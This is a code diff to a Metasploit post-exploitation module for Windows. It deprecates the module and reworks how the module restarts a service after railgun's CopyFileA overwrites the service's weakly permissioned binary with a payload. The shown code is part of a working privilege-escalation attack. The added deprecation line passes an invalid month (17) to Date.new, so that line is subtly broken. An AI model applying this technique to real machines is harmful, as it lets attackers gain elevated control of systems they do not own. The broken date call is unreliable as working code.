@@ -8,6 +8,10 @@ require 'rex'
 
 class Metasploit3 < Msf::Post
 
+  require 'msf/core/module/deprecated'
+  include Msf::Module::Deprecated
+  deprecated Date.new(2014, 17, 6), 'exploit/windows/local/service_permissions'
+
   include Msf::Post::Windows::Services
 
   def initialize(info={})
@@ -82,15 +86,11 @@ class Metasploit3 < Msf::Post
 
     services.each do |service|
       session.railgun.kernel32.CopyFileA(payload, vuln, false)
-      mng = session.railgun.advapi32.OpenSCManagerA(nil,nil,1)
-      if mng['return'].nil?
-        print_error("Cannot open service manager, not enough privileges")
-        return
-      end
-      # restart the service
-      status = service_start(service)
 
-      if status == Error::SUCCESS
+      # restart the service
+      status = service_restart(service)
+
+      if status
         print_status("Restarted #{service}")
       else
         print_error("Failed to restart #{service}")
